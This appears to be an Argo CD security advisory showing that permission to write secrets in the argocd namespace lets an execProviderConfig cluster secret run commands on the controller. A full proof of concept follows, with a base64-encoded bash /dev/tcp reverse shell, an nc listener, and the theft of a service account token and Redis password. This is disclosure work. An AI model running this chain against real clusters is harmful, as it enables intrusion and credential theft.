### Summary
An authenticated Kubernetes subject with Create/Patch/Update on any secret in the ArgoCD Kubernetes namespace can create a cluster that uses `execProviderConfig` to execute an arbitrary command on the `argocd-application-controller-0` Pod.

Regardless of whether this is classified as a vulnerability or not, this research highlights and documents the risks associated with secrets in Argo CD with the `execProviderConfig`. And raises the question if this should be a default option or not.

### Details
In [pull request 4709](https://github.com/argoproj/argo-cd/pull/4709) ArgoCD implements `ExecProviderConfig` which allows users to define an external executable to be called on-demand to retrieve API credentials. Perfect for cloud providers such as AWS which may use different credential types.

This in combination with ArgoCD's support to [declaratively add clusters](https://argo-cd.readthedocs.io/en/stable/operator-manual/declarative-setup/#clusters) to ArgoCD via Secrets allows a user who can Create/Patch/Update any secrets (in the argocd namespace) to execute code on the argocd-application-controller Pod.

### PoC
Deploy argocd according to documentation

```
kubectl apply -n 05-argocd-rce --server-side --force-conflicts -f https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
```

Add the following Kubernetes manifest to set up initial access for the attack:

```
apiVersion: v1
kind: Namespace
metadata:
  name: 05-argocd-rce 
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  creationTimestamp: null
  name: update-secrets
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["create", "update", "patch"]
---
apiVersion: v1
kind: ServiceAccount
metadata:
  creationTimestamp: null
  name: 05-argocd-rce-sa
  namespace: 05-argocd-rce
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  creationTimestamp: null
  name: 05-argocd-rce-rb
  namespace: 05-argocd-rce
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: update-secrets
subjects:
- kind: ServiceAccount
  name: 05-argocd-rce-sa
  namespace: 05-argocd-rce
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  creationTimestamp: null
  name: argocd-app-deploy
  namespace: 05-argocd-rce
rules:
- apiGroups: ["argoproj.io"]
  resources: ["applications"]
  verbs: ["get", "list", "watch", "create", "update", "patch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  creationTimestamp: null
  name: 05-argocd-rce-rb-apps
  namespace: 05-argocd-rce
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: argocd-app-deploy
subjects:
- kind: ServiceAccount
  name: 05-argocd-rce-sa
  namespace: 05-argocd-rce
```

Generate token as the service account:

```
$ export API="https://<API_SERVER>:6443"

$ export TOKEN=$(kubectl -n 05-argocd-rce create token 05-argocd-rce-sa )

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN  --kubeconfig <(echo) auth whoami
ATTRIBUTE                                           VALUE
Username                                            system:serviceaccount:05-argocd-rce:05-argocd-rce-sa
```

Generate reverse shell payload and build malicious cluster manifest:

```
$ export REV=$(echo -n 'bash -i >& /dev/tcp/<remote-ip>/9000 0>&1' | base64 -w0)

$ cat > argorce.yaml << EOF
apiVersion: v1
kind: Secret
metadata:
  name: rce
  namespace: 05-argocd-rce
  labels:
    argocd.argoproj.io/secret-type: cluster
type: Opaque
stringData:
  name: rce
  server: https://127.0.0.1:6443
  config: |
    {
        "bearerToken": "asdf",
        "execProviderConfig": {
            "command": "bash",
            "args": ["-c","echo $REV | base64 -d | bash"],
            "env": {
                "key": "value"
            },
            "apiVersion": "client.authentication.k8s.io/v1beta1",
            "installHint": "string"
        },
        "tlsClientConfig":
        {
            "insecure":true
        }
    }
EOF

$ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN  --kubeconfig <(echo) create -f argorce.yaml
```

Note: use `kubectl create`, not `kubectl apply`. `apply` first reads the existing object (`get` on `secrets`) to calculate a patch, and `05-argocd-rce-sa` can only `create`/`update`/`patch` Secrets, so `apply` fails with `cannot get resource "secrets"`. `create` sends the object directly. If the Secret already exists, use `kubectl replace -f argorce.yaml`, which also skips the read.

Create an ArgoCD deployment to the cluster to initiate an authentication command. This step stands in for normal Argo CD usage by its legitimate users; the `argocd-app-deploy` Role above grants `05-argocd-rce-sa` get/list/watch/create/update/patch on `applications.argoproj.io` in the `05-argocd-rce` namespace, so it works with `$TOKEN`:

```
$ cat > argoapp.yaml << EOF
apiVersion: argoproj.io/v1alpha1
kind: Application
metadata:
  name: asdf
  namespace: 05-argocd-rce
spec:
  destination:
    namespace: asdf
    server: https://127.0.0.1:6443
  source:
    path: asdf
    repoURL: asdf
    targetRevision: HEAD
  sources: []
  project: default
EOF

 $ kubectl --insecure-skip-tls-verify --server=$API --token=$TOKEN  --kubeconfig <(echo) apply -f argoapp.yaml
```

Catch the reverse shell on <remote-ip>:

```
$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [] from (UNKNOWN) [] 44229
argocd@argocd-server-5575668f66-hnvfn:~$ cat /run/secrets/kubernetes.io/serviceaccount/token
eyJhb....
argocd@argocd-server-5575668f66-hnvfn:~$ echo $REDIS_PASSWORD
ags3a...
```

### Impact
The impact is intended remote code execution which leads to lateral movement in a Kubernetes cluster.

### Advisories

Tracked at argoproj: https://github.com/argoproj/argo-cd/security/advisories/GHSA-r892-gqrx-rpx8 (not public)

```
I think what is understated in the Argo CD documentation is the fact that someone with the ability to directly create and/or manipulate resources directly in Argo CD's installation namespace is to be considered an Argo CD administrator, and in extension - if that Argo CD instance is cluster scoped - a cluster admin.

If you have someone with the ability to create/update/patch (and read) any secrets in the argocd namespace that is not a cluster admin, you usually have a big problem anyway.

So, I'm hesitant to classify what you reported here as a RCE vulnerability. But I'm happy to further discuss this issue and see what other fellow maintainers think, too.
```
